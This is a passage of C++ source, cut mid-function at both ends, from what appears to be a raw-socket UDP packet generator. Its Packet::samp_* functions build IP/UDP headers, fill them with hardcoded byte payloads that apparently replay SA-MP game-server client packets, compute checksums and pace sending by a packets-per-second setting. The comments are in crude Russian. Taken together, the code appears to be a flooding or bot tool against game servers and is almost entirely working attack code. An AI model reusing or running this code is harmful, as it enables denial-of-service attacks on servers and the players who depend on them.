x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x13\x22\x91\x04\x11\x22\x00\x14\x58\xf8\x11\x14\x22\x91\x04\x91\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x15\x22\x91\x05\x11\x27\xc0\x14\x5a\xe6\x0d\x0f\x8d\x44\x02\x00\x5d\xfc\x00\xb3\xaa\x3c\x20\x16\x22\x91\x05\x91\x0c\x60\x20\x14\x2c\xc8\x00\x38\x60\x23\x02\x40\x00\x08\x8d\xcc\x88\x8c\x4a\xd1\xc8\x91\x1f\x98\x68\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x17\x22\x91\x06\x11\x22\x00\x14\x98\xf8\x22\x18\x22\x91\x06\x91\x22\x00\x14\x14\xf0\xf0\x19\x22\x91\x07\x11\x22\xc0\x14\x1d\xe1\x00\x30\x00\x1a\x22\x91\x07\x91\x22\x00\x14\x1e\xf8\x01\x1b\x22\x91\x08\x11\x24\xc0\x14\x48\xe3\x00\x00\x0f\xf8\x28\x28\x20\x1c\x22\x91\x08\x91\x23\xc0\x14\x23\xe2\x0e\x58\x10\x00\x00\x1d\x22\x91\x09\x11\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x05\x00\x00\x00\x00\x1e\x22\x91\x09\x91\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x04\x00\x00\x00\x00\x1f\x22\x91\x0a\x11\x2b\xc0\x14\x2b\xea\x06\x73\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x20\x22\x91\x0a\x91\x27\xc0\x14\x9d\xe6\x05\x72\x13\x34\x5f\x68\x88\x84\x4e\xea\xcd\xbc\x40\x21\x22\x91\x0b\x11\x28\x40\x14\x9e\xe6\x8f\x15\xe2\x74\x58\xe5\x08\xc4\x45\x63\xb3\x9c\x50\x20\x22\x22\x91\x0b\x91\x22\x00\x14\x98\xf8\x29\x23\x22\x91\x0c\x11\x23\xc0\x14\x92\xe2\x09\xb5\xb8\x43\xd0\x24\x22\x91\x0c\x91\x22\x00\x14\x5e\xf8\x14", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa22(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 35; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe3\x07\x00\x02\x00\x64\x50\x06\x2e\xe3\x00\x00\x03\x00\x87\x00\x29\x04\x00\x64\x90\x09\xd4\x08\x49\x2f\x2e\xe3\x00\x00\x05\x00\x87\x00\x17", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa23(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 9; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x79\x01\xb2\x28\x06\xc9\xdd\x01\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa24(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 5; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x79\x81\xc3\x80\x17", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa25(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 9; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x7a\x81\xb2\x28\x06\xe2\x04\x02\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa26(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 32; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x01\x00\x32\x28\x06\x3a\xca\x01\x00\x03\x00\x87\x00\x29\x04\x00\x64\x90\x09\x66\x78\x4e\x2f\x3a\xca\x01\x00\x05\x00\x87\x00\x17", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt1(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 8; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe5\x02\x00\x02\x00\x02\x80\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt2(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 32; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x01\x00\x32\x28\x06\x99\x03\x02\x00\x03\x00\x87\x00\x29\x04\x00\x64\x90\x09\x36\xaf\xfb\x34\x99\x03\x02\x00\x05\x00\x87\x00\x17", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt3(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 361; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe3\x07\x00\x06\x00\x64\x50\x06\x9e\x03\x02\x00\x07\x00\x64\x90\x09\x39\xaf\xfb\x34\x9e\x03\x02\x00\x08\x00\x91\x00\x00\x23\xc0\x14\x3c\xe2\x0a\x80\x30\x20\x00\x09\x00\x91\x00\x80\x18\xc1\x20\x14\x8b\xd4\x61\x28\x00\x80\x38\x8d\x00\x00\x8c\x42\x41\xe0\x00\x00\x00\x00\x10\x10\x00\x00\x00\xc0\x16\xf1\x20\x33\xc0\x00\x00\x00\x00\xa0\x00\x00\x00\xa0\x00\x00\x00\xa0\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\xa9\x9d\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x98\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt4(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 180; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe3\x0a\x00\x0a\x00\x91\x01\x00\x27\xc0\x14\x0c\xe6\x0c\xd3\xd2\x64\x5c\x39\x20\x5c\x5b\x50\xab\xc4\x10\x0b\x00\x91\x01\x80\x23\xc0\x14\x13\xe2\x02\x0a\xe2\xe4\x20\x0c\x00\x91\x02\x00\x27\xc0\x14\x9d\xe6\x01\x6e\xd2\x54\x52\xd4\x70\x5c\x5e\x63\xdb\xe4\x10\x0d\x00\x91\x02\x80\x28\x40\x14\x9e\xe6\x8c\xd3\xd2\x64\x5c\x39\x20\x5c\x5b\x50\xab\xc4\x10\x20\x0e\x00\x91\x03\x00\x2e\x00\x14\x56\xec\x40\x00\x00\x35\x04\x54\x40\x94\x94\x44\xc4\x55\xf6\x36\x86\x17\x43\x33\x38\x34\x07\x01\x00\x00\x00\x0f\x00\x82\x6c\x04\x14\x80\xcf\x00\x20\x3f\xe6\x40\x00\x00\x0d\xba\x7c\x64\xe8\xa7\x3d\xda\x58\x86\x1e\xe2\xc8\x20\x00\x00\x00\x00\x00\x00\x00\x05\xc0\x00\x00\x05\x60\x00\x00\x1f\xff\xff\xff\xff\xff\xff\xff\xe5\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt5(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 3; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe3\x0b\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt6(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 8; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x08\x00\x42\x20\x14\x81\xf8\x01", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt7(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 3; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe3\x0c\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt8(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 132; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x08\x80\x48\x81\xc0\x0f\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x91\x04\x00\x27\xc0\x14\x0c\xe6\x0d\xd6\xaf\xdc\x4f\xfe\x4c\x0c\x20\x0a\x80\xc4\x20\x13\x00\x91\x04\x80\x25\xc0\x14\x16\xe4\x02\xb0\x00\x00\x04\xd0\x00\x00\x00\x14\x00\x91\x05\x00\x25\xc0\x14\x16\xe4\x02\xe0\x00\x00\x06\x40\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt9(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 17; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0a\x80\x48\x82\xc0\x12\x68\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt10(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 348; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0a\x80\x48\x82\xc0\x12\x68\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00\x16\x00\x91\x06\x00\x22\x00\x14\x98\xf8\x0f\x17\x00\x91\x06\x80\x23\xc0\x14\x92\xe2\x03\x2e\x5b\xb3\xd0\x18\x00\x91\x07\x00\x22\x00\x14\x5e\xf8\x08\x19\x00\x91\x07\x80\x22\xc0\x14\x1d\xe1\x00\xf0\x00\x1a\x00\x91\x08\x00\x2a\xc0\x14\x0b\xe9\x00\x00\x00\xe7\x97\x46\x87\x46\x86\x47\x23\x63\x73\x53\x47\x23\x67\x20\x10\x1b\x00\x91\x08\x80\x29\x40\x14\x0b\xe7\x80\x00\x00\xb7\x26\x83\x76\x93\x76\x87\x23\x76\x86\x97\x20\x10\x1c\x00\x91\x09\x00\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x47\x26\x73\x53\x63\x56\x73\x63\x57\x23\x66\x70\x10\x1d\x00\x91\x09\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc7\x36\x63\x63\x46\x53\x43\x53\x66\x77\x33\x46\x50\x10\x1e\x00\x91\x0a\x00\x29\x40\x14\x0b\xe7\x80\x00\x00\xb6\x57\x36\x63\x57\x36\x53\x43\x56\x63\x46\x50\x10\x1f\x00\x91\x0a\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x17\x76\x46\x47\x76\x16\x43\x36\x16\x46\x16\x40\x10\x20\x00\x91\x0b\x00\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x73\x66\x66\xa3\x73\x76\xa6\xa3\x73\x67\x40\x10\x21\x00\x91\x0b\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x67\x43\x83\x77\x43\x63\x76\xa3\x86\x63\x90\x10\x22\x00\x91\x0c\x00\x2a\x40\x14\x0b\xe8\x80\x00\x00\xd6\xa7\x43\x73\x87\x43\x73\x83\x77\x43\x83\x77\x43\x80\x10\x23\x00\x91\x0c\x80\x29\x40\x14\x0b\xe7\x80\x00\x00\xb6\x73\x57\x36\x53\x63\x56\x73\x63\x57\x36\x70\x10\x24\x00\x91\x0d\x00\x22\x00\x14\x98\xf8\x15", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt11(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 331; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x21\x80\x48\x8e\x40\x11\x00\x14\x98\xf8\x18\x44\x00\x91\x1d\x00\x23\xc0\x14\x92\xe2\x0d\x23\x10\xf3\xd0\x45\x00\x91\x1d\x80\x22\x00\x14\x5e\xf8\x0d\x46\x00\x91\x1e\x00\x22\xc0\x14\x1d\xe1\x01\x50\x00\x47\x00\x91\x1e\x80\x2a\xc0\x14\x0b\xe9\x00\x00\x00\xe7\x97\x46\x87\x46\x86\x47\x23\x63\x73\x53\x47\x23\x67\x20\x10\x48\x00\x91\x1f\x00\x29\x40\x14\x0b\xe7\x80\x00\x00\xb7\x26\x83\x76\x93\x76\x87\x23\x76\x86\x97\x20\x10\x49\x00\x91\x1f\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x47\x26\x73\x53\x63\x56\x73\x63\x57\x23\x66\x70\x10\x4a\x00\x91\x20\x00\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc7\x36\x63\x63\x46\x53\x43\x53\x66\x77\x33\x46\x50\x10\x4b\x00\x91\x20\x80\x29\x40\x14\x0b\xe7\x80\x00\x00\xb6\x57\x36\x63\x57\x36\x53\x43\x56\x63\x46\x50\x10\x4c\x00\x91\x21\x00\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x17\x76\x46\x47\x76\x16\x43\x36\x16\x46\x16\x40\x10\x4d\x00\x91\x21\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x73\x66\x66\xa3\x73\x76\xa6\xa3\x73\x67\x40\x10\x4e\x00\x91\x22\x00\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x67\x43\x83\x77\x43\x63\x76\xa3\x86\x63\x90\x10\x4f\x00\x91\x22\x80\x2a\x40\x14\x0b\xe8\x80\x00\x00\xd6\xa7\x43\x73\x87\x43\x73\x83\x77\x43\x83\x77\x43\x80\x10\x50\x00\x91\x23\x00\x29\x40\x14\x0b\xe7\x80\x00\x00\xb6\x73\x57\x36\x53\x63\x56\x73\x63\x57\x36\x70\x10\x51\x00\x91\x23\x80\x22\x00\x14\x98\xf8\x02", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt12(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 543; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x4e\x80\x48\xa4\xc0\x11\x00\x14\x98\xf8\x05\x9e\x00\x91\x4a\x00\x23\xc0\x14\x92\xe2\x01\x4a\xc8\x83\xd0\x9f\x00\x91\x4a\x80\x22\x00\x14\x5e\xf8\x0b\xa0\x00\x91\x4b\x00\x22\xc0\x14\x1d\xe1\x00\x80\x00\xa1\x00\x91\x4b\x80\x2a\xc0\x14\x0b\xe9\x00\x00\x00\xe7\x97\x46\x87\x46\x86\x47\x23\x63\x73\x53\x47\x23\x67\x20\x10\xa2\x00\x91\x4c\x00\x29\x40\x14\x0b\xe7\x80\x00\x00\xb7\x26\x83\x76\x93\x76\x87\x23\x76\x86\x97\x20\x10\xa3\x00\x91\x4c\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x47\x26\x73\x53\x63\x56\x73\x63\x57\x23\x66\x70\x10\xa4\x00\x91\x4d\x00\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc7\x36\x63\x63\x46\x53\x43\x53\x66\x77\x33\x46\x50\x10\xa5\x00\x91\x4d\x80\x29\x40\x14\x0b\xe7\x80\x00\x00\xb6\x57\x36\x63\x57\x36\x53\x43\x56\x63\x46\x50\x10\xa6\x00\x91\x4e\x00\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x17\x76\x46\x47\x76\x16\x43\x36\x16\x46\x16\x40\x10\xa7\x00\x91\x4e\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x73\x66\x66\xa3\x73\x76\xa6\xa3\x73\x67\x40\x10\xa8\x00\x91\x4f\x00\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x67\x43\x83\x77\x43\x63\x76\xa3\x86\x63\x90\x10\xa9\x00\x91\x4f\x80\x2a\x40\x14\x0b\xe8\x80\x00\x00\xd6\xa7\x43\x73\x87\x43\x73\x83\x77\x43\x83\x77\x43\x80\x10\xaa\x00\x91\x50\x00\x29\x40\x14\x0b\xe7\x80\x00\x00\xb6\x73\x57\x36\x53\x63\x56\x73\x63\x57\x36\x70\x10\xab\x00\x91\x50\x80\x22\x00\x14\x98\xf8\x0c\xac\x00\x91\x51\x00\x22\x00\x14\x98\xf8\x2a\xad\x00\x91\x51\x80\x23\xc0\x14\x92\xe2\x08\x32\x0b\x13\xd0\xae\x00\x91\x52\x00\x22\x00\x14\x5e\xf8\x07\xaf\x00\x91\x52\x80\x22\xc0\x14\x1d\xe1\x01\x10\x00\xb0\x00\x91\x53\x00\x2a\xc0\x14\x0b\xe9\x00\x00\x00\xe7\x97\x46\x87\x46\x86\x47\x23\x63\x73\x53\x47\x23\x67\x20\x10\xb1\x00\x91\x53\x80\x29\x40\x14\x0b\xe7\x80\x00\x00\xb7\x26\x83\x76\x93\x76\x87\x23\x76\x86\x97\x20\x10\xb2\x00\x91\x54\x00\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x47\x26\x73\x53\x63\x56\x73\x63\x57\x23\x66\x70\x10\xb3\x00\x91\x54\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc7\x36\x63\x63\x46\x53\x43\x53\x66\x77\x33\x46\x50\x10\xb4\x00\x91\x55\x00\x29\x40\x14\x0b\xe7\x80\x00\x00\xb6\x57\x36\x63\x57\x36\x53\x43\x56\x63\x46\x50\x10\xb5\x00\x91\x55\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x17\x76\x46\x47\x76\x16\x43\x36\x16\x46\x16\x40\x10", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt13(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 527; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
